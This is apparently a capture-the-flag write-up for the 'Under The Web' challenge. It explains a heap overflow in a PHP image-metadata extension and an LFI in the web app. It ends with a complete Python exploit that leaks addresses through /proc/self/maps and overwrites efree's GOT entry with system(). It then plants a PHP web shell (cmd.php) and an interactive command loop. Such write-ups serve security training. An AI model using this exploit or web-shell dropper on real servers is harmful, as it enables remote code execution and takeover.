![img](assets/banner.png)

<img src='assets/htb.png' style='zoom: 80%;' align=left /> <font size='10'>Under The Web</font>

16<sup>th</sup> Jul 2024

Prepared By: `0xSn4k3000`

Challenge Author(s): `0xSn4k3000`

Difficulty: <font color='orange'>Medium</font>

<br><br>

# Synopsis (!)

- LFI for addresses and offsets leaks.
- Exploit PHP Heap, small runs.
- Overwrite Global Offset Tables.
- Write a php shell for stability.

## Description (!)

- Dive deep under the web’s surface, where "L" in LFI stands for "LEAK". Will you conquer the depths and claim victory?

## Skills Required (!)

- Good knowledge of heap exploitation
- Reverse engineering
- Debugging php extensions

## Skills Learned (!)

- Learn how to exploit php heap small runs.
- Learn how use web vulnerabilities to achieve your goal in binary exploitation.

# Solution (!)

## Basic Analysis.

First look at the file we will see a php web application with three pages to view images, see all the images, and upload a new image.
Also, we have a php extension called metadata_reader.so, lets start by analyzing the php extension.

```bash
$ file
metadata_reader.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=ad7d8ecf217ef7ee30ca6a64803c3c64fa4631e4, with debug_info, not stripped
```

It's not stripped and with debug info, this will make it easy to reverse.

Let's see the security enabled.
```bash
$ checksec --file=./metadata_reader.so
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

No canary found and Partial RELRO, a buffer overflow will be more than easy to exploit if we found it and GOT overwrite is possible.

## Reverse Engineering.

In php extensions the user defined functions start with zif_* so we have only one function here which is `zif_getImgMetadata`

We can use ChatGPT to make the code from ghidra more readable

```c
void zif_getImgMetadata(long param_1, undefined8 *param_2) {
    char *filename;
    long tmpLong;
    char charVar;
    int intVar1, intVar2, numTexts;
    char **textEntries;
    FILE *file;
    char *pngReadStruct;
    __jmp_buf_tag *env;
    size_t strLength;
    undefined8 *allocPointer, *tempPointer1, *tempPointer2;
    ulong ulongVar;
    undefined8 undefinedVar1, undefinedVar2;
    uint uintVar;
    char *text;
    long longVar;
    undefined4 undefinedVar4;
    byte byteVar;
    
    // Initialize local variables
    int localTextCount = 0;
    undefined8 localUndefined8Var;
    undefined localTextBuffer[0x100] = {0};  // Buffer to store text data
    
    byteVar = 0;
    
    // Check parameter conditions
    if (*(uint *)(param_1 + 0x2c) < 2) {
        if (*(uint *)(param_1 + 0x2c) == 1) {
            if (*(char *)(param_1 + 0x58) == '\x06') {
                localUndefined8Var = *(long *)(param_1 + 0x50);
            } else {
                param_1 += 0x50;
                charVar = zend_parse_arg_str_slow(param_1, &localUndefined8Var, 1);
                undefinedVar1 = 9;
                undefinedVar2 = 4;
                undefinedVar4 = 1;
                if (charVar == '\0') {
                    goto parameterError;
                }
            }
            filename = (char *)(localUndefined8Var + 0x18);
        }

        // Allocate memory for text entries
        textEntries = (char **)_emalloc_56();
        textEntries[3] = filename;
        
        // Open the file
        file = fopen(filename, "rb");
        if (file == NULL) {
            php_error_docref(0, 2, "Unable to open file %s", textEntries[3]);
        } else {
            // Create png read struct
            pngReadStruct = (char *)png_create_read_struct("1.6.43", 0, 0, 0);
            textEntries[4] = pngReadStruct;
            if (pngReadStruct == NULL) {
                fclose(file);
                php_error_docref(0, 2, "Unable to create png read struct");
            } else {
                // Create png info struct
                pngReadStruct = (char *)png_create_info_struct();
                textEntries[5] = pngReadStruct;
                if (pngReadStruct == NULL) {
                    png_destroy_read_struct(textEntries + 4, 0, 0);
                    fclose(file);
                    php_error_docref(0, 2, "Unable to create png info struct");
                } else {
                    // Set longjmp for error handling
                    env = (__jmp_buf_tag *)png_set_longjmp_fn(textEntries[4], longjmp, 200);
                    intVar1 = _setjmp(env);
                    if (intVar1 == 0) {
                        // Read PNG file
                        png_init_io(textEntries[4], file);
                        png_read_info(textEntries[4], textEntries[5]);
                        intVar1 = png_get_text(textEntries[4], textEntries[5], textEntries + 6, &localTextCount);
                        if ((0 < intVar1) && (0 < localTextCount)) {
                            longVar = 0;
                            intVar1 = 0;
                            do {
                                while (true) {
                                    text = textEntries[6];
                                    char *keyword = *(char **)(text + longVar + 8);
                                    intVar2 = strcmp(keyword, "Title");
                                    if (intVar2 == 0) break;
                                    intVar2 = strcmp(keyword, "Artist");
                                    if (intVar2 == 0) {
                                        strLength = strlen(*(char **)(text + longVar + 0x10));
                                        if (1 < strLength) {
                                            text = (char *)_emalloc_56();
                                            *textEntries = text;
                                            if (text != NULL) goto storeText;
                                        }
                                    } else {
                                        intVar2 = strcmp(keyword, "Copyright");
                                        if ((intVar2 == 0) && (strLength = strlen(*(char **)(text + longVar + 0x10)), 1 < strLength)) {
                                            text = (char *)_emalloc_56();
                                            textEntries[2] = text;
                                            goto storeNextText;
                                        }
                                    }
skipText:
                                    intVar1++;
                                    longVar += 0x38;
                                    if (localTextCount <= intVar1) goto endLoop;
                                }
                                strLength = strlen(*(char **)(text + longVar + 0x10));
                                if (strLength < 2) goto skipText;
                                text = (char *)_emalloc_56();
                                textEntries[1] = text;
storeNextText:
                                if (text == NULL) goto skipText;
storeText:
                                intVar1++;
                                tmpLong = longVar + 0x10;
                                longVar += 0x38;
                                strcpy(text, *(char **)(textEntries[6] + tmpLong));
                            } while (intVar1 < localTextCount);
                        }
endLoop:
                        // Clean up and close file
                        png_destroy_read_struct(textEntries + 4, textEntries + 5, 0);
                        fclose(file);
                        
                        // Prepare metadata string
                        char *title = textEntries[1];
                        strLength = strlen(localTextBuffer);
                        text = localTextBuffer + strLength;
                        if (title == NULL) {
                            ap_php_snprintf(text, 0x100 - strLength, "Title: UnKnown\n");
                        } else {
                            ap_php_snprintf(text, 0x100 - strLength, "Title: %s\n", title);
                            _efree(textEntries[1]);
                        }
                        
                        char *artist = *textEntries;
                        strLength = strlen(localTextBuffer);
                        text = localTextBuffer + strLength;
                        if (artist == NULL) {
                            ap_php_snprintf(text, 0x100 - strLength, "Artist: UnKnown\n");
                        } else {
                            ap_php_snprintf(text, 0x100 - strLength, "Artist: %s\n", artist);
                            _efree(*textEntries);
                        }
                        
                        char *copyright = textEntries[2];
                        strLength = strlen(localTextBuffer);
                        text = localTextBuffer + strLength;
                        if (copyright == NULL) {
                            ap_php_snprintf(text, 0x100 - strLength, "Copyright: UnKnown\n");
                        } else {
                            ap_php_snprintf(text, 0x100 - strLength, "Copyright: %s\n", copyright);
                            _efree(textEntries[2]);
                        }
                        
                        // Free allocated memory
                        _efree(textEntries);
                        
                        // Allocate memory for metadata
                        strLength = strlen(localTextBuffer);
                        allocPointer = (undefined8 *)_emalloc(strLength + 0x20 & 0xfffffffffffffff8);
                        allocPointer[1] = 0;
                        *allocPointer = 0x1600000001;
                        allocPointer[2] = strLength;
                        uintVar = (uint)strLength;
                        
                        // Copy metadata to allocated memory
                        if (uintVar < 8) {
                            if ((strLength & 4) == 0) {
                                if (uintVar != 0) {
                                    *(char *)(allocPointer + 3) = localTextBuffer[0];
                                    if ((strLength & 2) != 0) {
                                        *(undefined2 *)((long)allocPointer + (strLength & 0xffffffff) + 0x16) = *(undefined2 *)(localTextBuffer + ((strLength & 0xffffffff) - 2));
                                    }
                                }
                            } else {
                                *(undefined4 *)(allocPointer + 3) = localTextBuffer._0_4_;
                                *(undefined4 *)((long)allocPointer + (strLength & 0xffffffff) + 0x14) = *(undefined4 *)(localTextBuffer + ((strLength & 0xffffffff) - 4));
                            }
                        } else {
                            allocPointer[3] = localTextBuffer._0_8_;
                            *(undefined8 *)((long)allocPointer + (strLength & 0xffffffff) + 0x10) = *(undefined8 *)(localTextBuffer + ((strLength & 0xffffffff) - 8));
                            longVar = (long)allocPointer + (0x18 - (long)(undefined8 *)((ulong)(allocPointer + 4) & 0xfffffffffffffff8));
                            tempPointer1 = (undefined8 *)(localTextBuffer + -longVar);
                            tempPointer2 = (undefined8 *)((ulong)(allocPointer + 4) & 0xfffffffffffffff8);
                            for (ulongVar = (ulong)((int)longVar + uintVar >> 3); ulongVar != 0; ulongVar--) {
                                *tempPointer2 = *tempPointer1;
                                tempPointer1 += (ulong)byteVar * -2 + 1;
                                tempPointer2 += (ulong)byteVar * -2 + 1;
                            }
                        }
                        *(undefined *)((long)allocPointer + strLength + 0x18) = 0;
                        *param_2 = allocPointer;
                        *(undefined4 *)(param_2 + 1) = 0x106;
                    } else {
                        png_destroy_read_struct(textEntries + 4, textEntries + 5, 0);
                        fclose(file);
                        php_error_docref(0, 2, "Error during png creation");
                    }
                }
            }
        }
    } else {
        param_1 = 0;
        undefinedVar4 = 0;
        zend_wrong_parameters_count_error(0, 1);
        undefinedVar1 = 1;
        undefinedVar2 = 0;
parameterError:
        zend_wrong_parameter_error(undefinedVar1, undefinedVar4, 0, undefinedVar2, param_1);
    }
    return;
}

```

The extension function zif_getImageMetadata() read a filename from parameters then open the file, it's suppose the file is a png image, then it's pass the image to a png functions from png.h library in c, it's used to read the metadata of the image, it's read the Title, Artist, and the Copyright from the metadata.

### First Vulnerability

After reading the metadata from the image the extension allocate some heap chunks for each metadata value, using `(char *)_emalloc_56()` which will allocate a chunk with size 56 bytes, which mean 56 bytes only for each metadata value. The vulnerability arise in the `storeText` label.

```c
storeText:
                                intVar1++;
                                tmpLong = longVar + 0x10;
                                longVar += 0x38;
                                strcpy(text, *(char **)(textEntries[6] + tmpLong));
```

It's use strcpy to copy the value from png.h heap to our heap, which is vulnerable to buffer overflow because it's not checking the size of string it copy, now we have a heap buffer overflow. 

## PHP Small runs

PHP small runs functions (emalloc and efree) are lack security checks, the free chunk contains the next chunk pointer, when you allocate the chunk the fd of next chunk will be what ever was in the chunk before it's being allocated, so if we overflowed the current chunk and overwrote the next chunk pointer we will have a chunk on our target after the next allocation

For example:
```asm
              : 0x00007ffff4c5c1f8      0x0000000000000000 <- chunk 1. contains the address of next chunk
0x7ffff4c5c1d0: 0x0000000000000000      0x0000000000000000
0x7ffff4c5c1e0: 0x0000000000000000      0x0000000000000000
0x7ffff4c5c1f0: 0x0000000000000000      0x00007ffff4c5c230 <- chunk 2
0x7ffff4c5c200: 0x0000000000000000      0x0000000000000000
0x7ffff4c5c210: 0x0000000000000000      0x0000000000000000
0x7ffff4c5c220: 0x0000000000000000      0x0000000000000000
0x7ffff4c5c230: 0x00007ffff4c5c268      0x0000000000000000 <- chunk 3
```
If current chunk allocated is chunk 1 then FD will be 0x7ffff4c5c1f8, this mean next allocation will be 0x7ffff4c5c1f8 and FD will be the address in 0x7ffff4c5c1f8, so if we overwrite the address in chunk 2 before it's being allocated we can control the chunk 3 allocation place.

## What we have till now.

The binary doesn't have a FULL RELRO, which means we can over the addresses in the global offset table, the problem is we don't have any leaks and PIE is enabled.

## Continue analyzing the application

The web application contains three pages, the view image page is vulnerable to LFI.
```php
<?php
    if (isset($_GET['image'])) {
        $image = urldecode($_GET['image']);
        if (file_exists($image)) {
            echo '<img src="data:image/png;base64,' . base64_encode(file_get_contents($image)) . '" alt="Full Image">';
        } else {
            echo '<p>Image not found.</p>';
        }
    } else {
        echo '<p>No image specified.</p>';
    }
?>
```

It's using file_get_contents() to read the image from GET parameter without checks. We can't read the flag, so it's will not be easy.

## Using the web vulnerability as an exploitation primitive.

We can use the lfi to leak all the virtual map of php by reading `/proc/self/maps`.
We can also read the `libc.so.6` file to get the right offset of functions we want.

## Final Exploit.

1. First use the LFI vulnerability to read the `libc.so.6`.
We can use curl to get the file then get the base64.
```bash
curl localhost:8000/view.php?image=/usr/lib/x86_64-linux-gnu/libc.so.6 | grep base64 | cut -d '"' -f 2 | tee libc.so.6.b64
```
After that we can decode it and get the library.

2. Get the `/proc/self/maps` to get all address we need.
3. Create a png image with metadata to overwrite the second chunk address to be efree@got address.
4. Overwrite efree@got to be system() address from libc, as the extension free the chunks in the end of the function we can control what will be passed to system() which is the content of our metadata.
5. Run shell commands to create a cmd.php file which will be used to run commands.

```python3
#!/usr/bin/python3

from PIL import Image
from PIL.PngImagePlugin import PngInfo
from requests import get, post
from pwn import *
import re
from base64 import b64decode

URL = "http://172.17.0.2:8000"

meta = {
    "Artist": "CCCCC",
    "Title": "Title",
    "Copyright": "test"
}

image = "./hack.png"

def write_png_metadata(image_path, metadata_dict):
    image = Image.open(image_path)

    metadata = PngInfo()

    for key, value in metadata_dict.items():
        metadata.add_text(key, value)

    image.save(image_path, pnginfo=metadata)

def upload(image):
    global URL

    with open(image, "rb") as file:
        files = {"file":file}
        res = post(URL + "/upload.php", files=files)
    return res

# Leaking Addresses

res = get(f"{URL}/view.php?image=/proc/self/maps")

base64_pattern = r'data:image\/png;base64,([^"]+)'
match = re.search(base64_pattern, res.text)

if match:
    vmmap = b64decode(match.group(1)).decode()
    log.info("Read the /proc/self/maps")

    pattern = re.compile(r"([0-9a-f]+)-[0-9a-f]+ [rwxp\-]{4} \d{8} \d{2}:\d{2} \d+ +.*/metadata_reader\.so")
    match = pattern.search(vmmap)

    EXT_BASE = int("0x" + match.group(1), 16)

    pattern = re.compile(r"([0-9a-f]+)-[0-9a-f]+ [rwxp\-]{4} \d{8} \d{2}:\d{2} \d+ +.*/libc\.so\.6")
    match = pattern.search(vmmap)

    LIBC_BASE = int("0x" + match.group(1), 16)

    log.info("extension base address: " + hex(EXT_BASE))
    log.info("libc base address: " + hex(LIBC_BASE))

else:
    log.error("Can't read the /proc/self/maps, the exploit will exit")
    exit()



SYSTEM = LIBC_BASE + 0x4c3a0
GOT = EXT_BASE + 0x4090

log.info("libc system address: " + hex(SYSTEM))
log.info("global offset table address for efree: " + hex(GOT))

CMD1 = b"echo PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTsgPz4= > tmp"
CMD2 = b"base64 -d < tmp > cmd.php ; echo "

meta["Artist"] = CMD2 + b"A" * (56 - len(CMD2)) + p64(GOT)
meta["Title"] = CMD1
meta["Copyright"] =  p64(SYSTEM)

write_png_metadata(image, meta)

res = upload(image)

while True:
    cmd = input("$ ")
    print(get(URL + f"/cmd.php?cmd={cmd}").text)
```